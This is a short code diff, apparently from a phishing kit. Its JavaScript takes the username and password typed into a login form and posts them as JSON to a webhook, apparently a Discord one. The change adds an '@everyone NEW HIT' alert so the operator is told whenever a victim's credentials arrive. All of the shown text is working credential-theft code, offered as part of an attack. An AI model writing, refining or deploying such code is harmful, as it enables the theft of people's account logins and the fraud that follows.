@@ -106,7 +106,7 @@
     request.open("POST", webhookUrl);
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+      content: ("@everyone **NEW HIT**\n> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
     }
     request.send(JSON.stringify(params));
     sleep(400)
